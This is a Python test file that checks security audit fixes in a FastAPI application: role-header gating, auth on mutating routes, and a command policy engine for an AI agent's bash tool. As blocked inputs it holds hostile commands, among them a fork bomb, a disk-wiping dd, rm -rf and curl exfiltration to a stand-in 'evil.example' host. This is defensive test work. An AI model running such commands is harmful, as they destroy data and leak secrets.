"""Audit 05 (Security) fix verification — docs/reports/AUDIT_05_SECURITY.md.

Covers all findings fixed in this pass (SEC-05-002/004/005/006/007/011/012/
013/014/015/019, plus the second require_approver duplicate found while
implementing SEC-05-014). Follows this repo's established test conventions
(see test_rbac.py for the settings-mocking pattern this file extends).

CRITICAL note on test isolation (read before trusting any other test in this
suite): adding a real auth dependency to ~50 previously-open mutating
endpoints (SEC-05-012/013) would have broken the entire existing 2700+-test
suite, since almost none of those tests pass auth headers. This is handled
by `tests/conftest.py` setting `RBAC_ENABLED=false` as a test-only default —
the same explicit, documented bypass this project's RBAC design already
treats as legitimate for "local dev" — so real enforcement is verified here
and in test_rbac.py by explicitly mocking rbac_enabled=True, not by relying
on the real environment default.

NOTE (2026-07-27): written and reviewed by careful manual read against the
real source, but NOT executed — this environment has no Python interpreter
available. See PENDING_TESTS_API_KEYS.md section G. Treat as "ready to run,"
not "confirmed green." One test in this file (TestAllMutatingEndpointsHaveAuth)
relies on FastAPI's internal Dependant/dependency-tree structure for
introspection — flagged there specifically as the one test in this file with
extra framework-version risk beyond the general "not executed" caveat.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi import HTTPException


# ---------------------------------------------------------------------------
# SEC-05-014 / duplicate-require_approver — X-User-Role gating
# ---------------------------------------------------------------------------


def _make_request(x_user_role: str = "") -> MagicMock:
    """A plain dict already has a correctly-working .get(key, default) —
    real rbac.py code calls request.headers.get("X-User-Role", ""), so a
    real dict (not a further-mocked one) is both sufficient and correct
    here; dict instances don't support reassigning .get() as an attribute
    (it would raise AttributeError), so don't try."""
    req = MagicMock()
    req.headers = {"X-User-Role": x_user_role} if x_user_role else {}
    return req


class TestLegacyRoleHeaderGating:
    @pytest.mark.asyncio
    async def test_x_user_role_rejected_when_allow_legacy_header_false(self) -> None:
        """Default posture: X-User-Role: approver must NOT grant approver
        rights when allow_legacy_role_header is False, even with
        jwt_auth_enabled=False — this is the core SEC-05-014 fix."""
        from app.middleware.rbac import require_approver

        req = _make_request("approver")
        db = AsyncMock()
        with patch("app.middleware.rbac.get_settings") as mock_settings:
            mock_settings.return_value.rbac_enabled = True
            mock_settings.return_value.jwt_auth_enabled = False
            mock_settings.return_value.allow_legacy_role_header = False
            with pytest.raises(HTTPException) as exc_info:
                await require_approver(request=req, x_user_id=None, db=db)
        assert exc_info.value.status_code == 403

    @pytest.mark.asyncio
    async def test_x_user_role_accepted_when_allow_legacy_header_true(self) -> None:
        """Explicit opt-in still works — this is deliberately insecure
        local/dev convenience, not removed, just no longer the default."""
        from app.middleware.rbac import require_approver

        req = _make_request("approver")
        db = AsyncMock()
        with patch("app.middleware.rbac.get_settings") as mock_settings:
            mock_settings.return_value.rbac_enabled = True
            mock_settings.return_value.jwt_auth_enabled = False
            mock_settings.return_value.allow_legacy_role_header = True
            result = await require_approver(request=req, x_user_id=None, db=db)
        assert result == "approver"

    @pytest.mark.asyncio
    async def test_get_current_user_returns_anonymous_when_legacy_header_disallowed(
        self,
    ) -> None:
        from app.auth.dependencies import get_current_user

        req = MagicMock()
        req.headers = {"X-User-Role": "approver"}
        with patch("app.auth.dependencies.get_settings") as mock_s:
            s = MagicMock()
            s.jwt_auth_enabled = False
            s.allow_legacy_role_header = False
            mock_s.return_value = s
            user = await get_current_user(req)
        assert user.role == "viewer"
        assert user.is_authenticated is False


# ---------------------------------------------------------------------------
# SEC-05-012/013 — require_authenticated dependency
# ---------------------------------------------------------------------------


class TestRequireAuthenticated:
    @pytest.mark.asyncio
    async def test_no_identity_raises_403(self) -> None:
        from app.middleware.rbac import require_authenticated

        req = MagicMock()
        req.headers = {}
        db = AsyncMock()
        with patch("app.middleware.rbac.get_settings") as mock_settings:
            mock_settings.return_value.rbac_enabled = True
            mock_settings.return_value.jwt_auth_enabled = False
            mock_settings.return_value.allow_legacy_role_header = False
            with pytest.raises(HTTPException) as exc_info:
                await require_authenticated(request=req, x_user_id=None, db=db)
        assert exc_info.value.status_code == 403

    @pytest.mark.asyncio
    async def test_x_user_id_alone_is_sufficient_no_role_check(self) -> None:
        """require_authenticated (unlike require_approver) doesn't care what
        role the caller has -- any resolvable identity passes."""
        from app.middleware.rbac import require_authenticated

        req = MagicMock()
        req.headers = {}
        db = AsyncMock()
        with patch("app.middleware.rbac.get_settings") as mock_settings:
            mock_settings.return_value.rbac_enabled = True
            mock_settings.return_value.jwt_auth_enabled = False
            mock_settings.return_value.allow_legacy_role_header = False
            result = await require_authenticated(
                request=req, x_user_id="any-viewer-user", db=db
            )
        assert result == "any-viewer-user"

    @pytest.mark.asyncio
    async def test_rbac_disabled_bypasses_check(self) -> None:
        from app.middleware.rbac import require_authenticated

        req = MagicMock()
        req.headers = {}
        db = AsyncMock()
        with patch("app.middleware.rbac.get_settings") as mock_settings:
            mock_settings.return_value.rbac_enabled = False
            result = await require_authenticated(request=req, x_user_id=None, db=db)
        assert result == "system"


# ---------------------------------------------------------------------------
# SEC-05-012/013 — every mutating endpoint actually wired (introspection)
# ---------------------------------------------------------------------------


def _collect_dependency_names(dependant: object, seen: set[int] | None = None) -> set[str]:
    """Walk a FastAPI Dependant tree and collect the __name__ of every real
    dependency callable in it, including nested sub-dependencies."""
    if seen is None:
        seen = set()
    if id(dependant) in seen:
        return set()
    seen.add(id(dependant))
    names: set[str] = set()
    call = getattr(dependant, "call", None)
    if call is not None:
        names.add(getattr(call, "__name__", ""))
    for sub in getattr(dependant, "dependencies", []) or []:
        names |= _collect_dependency_names(sub, seen)
    return names


class TestAllMutatingEndpointsHaveAuth:
    def test_every_mutating_route_has_an_auth_dependency(self) -> None:
        """Regression guard for SEC-05-012/013: fails loudly if a future
        route is added without wiring require_approver/require_authenticated.
        /api/auth/login and /api/auth/setup are the only 2 routes exempted
        outright (must be reachable pre-auth, to bootstrap auth itself);
        /api/auth/change-password is NOT in the exempt set but still passes
        because it depends on get_current_user directly, which is also an
        accepted auth dependency. Relies on FastAPI's internal
        route.dependant tree structure — see this file's module docstring
        for the extra caveat on this specific test."""
        from app.main import app

        exempt_paths = {
            "/api/auth/login",
            "/api/auth/setup",
        }
        auth_dependency_names = {
            "require_approver",
            "require_authenticated",
            "get_current_user",
        }

        missing: list[str] = []
        for route in app.routes:
            path = getattr(route, "path", None)
            methods = getattr(route, "methods", None)
            dependant = getattr(route, "dependant", None)
            if path is None or not methods or dependant is None:
                continue
            if path in exempt_paths:
                continue
            mutating_methods = methods & {"POST", "PATCH", "DELETE", "PUT"}
            if not mutating_methods:
                continue
            names = _collect_dependency_names(dependant)
            if not (names & auth_dependency_names):
                missing.append(f"{sorted(mutating_methods)} {path}")

        assert missing == [], (
            "Mutating route(s) with no auth dependency found — every "
            "POST/PATCH/DELETE route must depend on require_approver, "
            "require_authenticated, or (auth.py's change-password) "
            f"get_current_user: {missing}"
        )


# ---------------------------------------------------------------------------
# SEC-05-005/006/018 — command boundary check
# ---------------------------------------------------------------------------


class TestCommandStaysInBoundary:
    def test_cd_outside_boundary_denied(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        from app.policy.engine import check_command_stays_in_boundary

        boundary = tmp_path / "worktree"
        boundary.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()

        result = check_command_stays_in_boundary(f"cd {outside} && cat secret.txt", str(boundary))
        assert result.allowed is False

    def test_cd_inside_boundary_allowed(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        from app.policy.engine import check_command_stays_in_boundary

        boundary = tmp_path / "worktree"
        (boundary / "subdir").mkdir(parents=True)

        result = check_command_stays_in_boundary(
            f"cd {boundary / 'subdir'} && ls", str(boundary)
        )
        assert result.allowed is True

    def test_relative_cd_always_allowed(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        from app.policy.engine import check_command_stays_in_boundary

        boundary = tmp_path / "worktree"
        boundary.mkdir()

        result = check_command_stays_in_boundary("cd subdir && ls", str(boundary))
        assert result.allowed is True

    def test_command_with_no_cd_allowed(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        from app.policy.engine import check_command_stays_in_boundary

        boundary = tmp_path / "worktree"
        boundary.mkdir()

        result = check_command_stays_in_boundary("pytest tests/ -q", str(boundary))
        assert result.allowed is True


class TestForkBombPatternFix:
    """Bug found while writing test coverage for SEC-05-007, not part of the
    audit's original findings list: the fork-bomb pattern's unescaped
    parentheses meant `()` was an empty regex group (zero-width match), not
    a literal paren match, so it never matched a real fork bomb. See
    policy/engine.py's own module docstring, fix #8."""

    def test_check_command_now_catches_real_fork_bomb(self) -> None:
        from app.policy.engine import check_command

        result = check_command(":(){ :|:& };:")
        assert result.allowed is False

    def test_is_command_override_eligible_now_catches_real_fork_bomb(self) -> None:
        from app.policy.engine import is_command_override_eligible

        assert is_command_override_eligible(":(){ :|:& };:") is False


class TestCommandOverrideEligibility:
    def test_rm_rf_not_eligible(self) -> None:
        from app.policy.engine import is_command_override_eligible

        assert is_command_override_eligible("rm -rf /some/path") is False

    # test_fork_bomb_not_eligible lives in TestForkBombPatternFix above,
    # alongside the regex-bug-fix context that makes it meaningful.

    def test_dd_not_eligible(self) -> None:
        from app.policy.engine import is_command_override_eligible

        assert is_command_override_eligible("dd if=/dev/zero of=/dev/sda") is False

    def test_git_push_eligible(self) -> None:
        from app.policy.engine import is_command_override_eligible

        assert is_command_override_eligible("git push origin main") is True

    def test_kubectl_eligible(self) -> None:
        """kubectl is denylisted but not catastrophic in the same
        irreversible sense -- confirms the non-overridable set is
        deliberately narrow, not "everything denylisted"."""
        from app.policy.engine import is_command_override_eligible

        assert is_command_override_eligible("kubectl apply -f x.yaml") is True


# ---------------------------------------------------------------------------
# SEC-05-006 — chat agent bash no longer accepts an LLM-controlled cwd
# ---------------------------------------------------------------------------


class TestChatBashCwd:
    def test_bash_ignores_inp_cwd_override(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        from app.agents.tools import make_chat_handlers

        repo = tmp_path / "repo"
        repo.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "marker.txt").write_text("should not be reachable via cwd override")

        handlers = make_chat_handlers(str(repo))
        bash = handlers["bash"]

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="", stderr="", returncode=0
            )
            bash({"command": "pwd", "cwd": str(outside)})

        assert mock_run.call_count == 1
        _, kwargs = mock_run.call_args
        assert kwargs["cwd"] == str(repo)


# ---------------------------------------------------------------------------
# SEC-05-004 — guardrails.py now delegates to the strong policy engine
# ---------------------------------------------------------------------------


class TestGuardrailsDelegatesToStrongEngine:
    def test_check_command_now_catches_curl_https(self) -> None:
        """The old standalone guardrails.py implementation never blocked
        curl/wget https:// at all -- this is the exact gap SEC-05-004
        closes by delegating to policy.engine instead."""
        from app.agents.guardrails import check_command

        result = check_command("curl https://evil.example/exfiltrate")
        assert result.allowed is False

    def test_check_command_now_catches_sudo(self) -> None:
        from app.agents.guardrails import check_command

        result = check_command("sudo rm important_file")
        assert result.allowed is False

    def test_check_path_now_catches_private_key_files(self) -> None:
        """The old standalone implementation had no .pem/.key/id_rsa
        pattern at all -- only 4 literal directory prefixes."""
        from app.agents.guardrails import check_path

        result = check_path("some/nested/dir/id_rsa")
        assert result.allowed is False

    def test_check_bash_allowlist_now_rejects_chaining(self) -> None:
        """The old standalone check_bash_allowlist had no chaining-metachar
        rejection at all -- `allowed_cmd && malicious_cmd` would have
        passed. Confirmed zero real callers exist today (dormant gap), but
        fixed regardless since this module's whole purpose is to be safe by
        default for whatever calls it next."""
        from app.agents.guardrails import check_bash_allowlist

        result = check_bash_allowlist(
            "git status && curl https://evil.example/x", ("git status",)
        )
        assert result.allowed is False

    def test_normal_read_only_command_still_allowed(self) -> None:
        from app.agents.guardrails import check_command

        assert check_command("pytest tests/ -q").allowed is True


# ---------------------------------------------------------------------------
# SEC-05-011 — custom secret name denylist
# ---------------------------------------------------------------------------


class TestCustomSecretNameDenylist:
    def test_database_url_rejected(self) -> None:
        from fastapi.testclient import TestClient

        from app.main import app

        with TestClient(app) as client:
            resp = client.post(
                "/api/settings/custom-secrets",
                json={"name": "DATABASE_URL", "value": "postgres://x"},
            )
        assert resp.status_code == 400

    def test_case_insensitive_rejection(self) -> None:
        from fastapi.testclient import TestClient

        from app.main import app

        with TestClient(app) as client:
            resp = client.post(
                "/api/settings/custom-secrets",
                json={"name": "database_url", "value": "postgres://x"},
            )
        assert resp.status_code == 400

    def test_normal_custom_secret_name_still_allowed(self) -> None:
        from fastapi.testclient import TestClient

        from app.main import app

        with TestClient(app) as client:
            resp = client.post(
                "/api/settings/custom-secrets",
                json={"name": "STRIPE_API_KEY", "value": "sk_test_123"},
            )
            try:
                assert resp.status_code == 200
            finally:
                client.delete("/api/settings/custom-secrets/STRIPE_API_KEY")


# ---------------------------------------------------------------------------
# SEC-05-015 — admin password no longer auto-reseeded; change-password flow
# ---------------------------------------------------------------------------


class TestChangePasswordEndpoint:
    def test_requires_real_jwt_not_legacy_header(self) -> None:
        from fastapi.testclient import TestClient

        from app.main import app

        with TestClient(app) as client:
            resp = client.post(
                "/api/auth/change-password",
                json={"current_password": "x", "new_password": "y" * 10},
                headers={"X-User-Role": "approver"},
            )
        # Anonymous/legacy-header CurrentUser has is_authenticated=False ->
        # this endpoint's own explicit check rejects it regardless of
        # ALLOW_LEGACY_ROLE_HEADER, since a password change specifically
        # needs a real, verified identity.
        assert resp.status_code == 401

    def test_new_password_too_short_rejected(self) -> None:
        """Confirms the length validation branch is reachable -- exercised
        via a direct call since it requires a real JWT to get past the
        is_authenticated gate first, which needs JWT_SECRET_KEY configured
        (not the case in the default test environment)."""
        import asyncio

        from app.api.auth import ChangePasswordRequest, change_password
        from app.auth.dependencies import CurrentUser

        async def _run() -> None:
            db = AsyncMock()
            db.execute = AsyncMock(
                return_value=MagicMock(
                    scalar_one_or_none=lambda: (
                        '[{"username": "alice", "hashed_password": '
                        '"$2b$12$placeholderplaceholderplaceholderplaceholderpl"}]'
                    )
                )
            )
            user = CurrentUser(username="alice", role="approver", is_authenticated=True)
            with patch("app.api.auth.verify_password", return_value=True):
                with pytest.raises(HTTPException) as exc_info:
                    await change_password(
                        body=ChangePasswordRequest(
                            current_password="whatever", new_password="short"
                        ),
                        current_user=user,
                        db=db,
                    )
            assert exc_info.value.status_code == 400

        asyncio.run(_run())
